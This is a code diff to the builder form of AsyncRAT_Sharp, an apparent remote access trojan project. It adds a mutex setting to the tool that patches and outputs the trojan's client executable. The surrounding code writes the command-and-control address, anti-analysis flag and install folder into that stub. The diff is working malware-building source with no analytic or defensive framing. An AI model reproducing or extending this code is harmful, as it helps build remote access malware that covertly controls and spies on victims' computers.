@@ -24,6 +24,8 @@ namespace AsyncRAT_Sharp.Forms
                 if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                 if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
             }
+            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Guid.NewGuid().ToString().Substring(10);
+
             try
             {
                 button1.Enabled = false;
@@ -57,10 +59,10 @@ namespace AsyncRAT_Sharp.Forms
                                         method.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
-                                        method.Body.Instructions[i].Operand = Settings.Password; //Guid.NewGuid().ToString();
+                                        method.Body.Instructions[i].Operand = txtMutex.Text;
 
-                                    if (method.Body.Instructions[i].Operand.ToString() == "NYAN CAT")
-                                        method.Body.Instructions[i].Operand = Settings.Password;
+                                    //if (method.Body.Instructions[i].Operand.ToString() == "NYAN CAT")
+                                       // method.Body.Instructions[i].Operand = Settings.Password;
                                 }
                             }
                         }
@@ -92,6 +94,7 @@ namespace AsyncRAT_Sharp.Forms
                         MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                         Properties.Settings.Default.DNS = textIP.Text;
                         Properties.Settings.Default.Filename = textFilename.Text;
+                        Properties.Settings.Default.Mutex = txtMutex.Text;
                         Properties.Settings.Default.Save();
                         button1.Enabled = true;
                         this.Close();
@@ -130,12 +133,16 @@ namespace AsyncRAT_Sharp.Forms
         {
             comboBoxFolder.SelectedIndex = 0;
             textPort.Text = Settings.Port;
+            txtMutex.Text = Guid.NewGuid().ToString().Substring(10);
             if (Properties.Settings.Default.DNS.Length > 0)
                 textIP.Text = Properties.Settings.Default.DNS;
             else
                 textIP.Text = "127.0.0.1,127.0.0.1";
             if (Properties.Settings.Default.Filename.Length > 0)
                 textFilename.Text = Properties.Settings.Default.Filename;
+
+            if (Properties.Settings.Default.Mutex.Length > 0)
+                txtMutex.Text = Properties.Settings.Default.Mutex;
         }
     }
 }
